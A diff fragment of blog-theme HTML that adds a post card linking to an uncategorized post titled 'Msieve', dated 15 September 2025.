+        <a href="/2025/09/15/T-Msieve/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">15</div>
+                    <div class="trm-cover-month">2025/09</div>
+                </div>
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" #.">
+                    未分类
+                </a>
+            </div>
+            <h5>
+                <a href="/2025/09/15/T-Msieve/" class="trm-anima-link">
+                    Msieve
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/09/15</li>
+                <li>14:44</li>
                 
                 
             </ul>
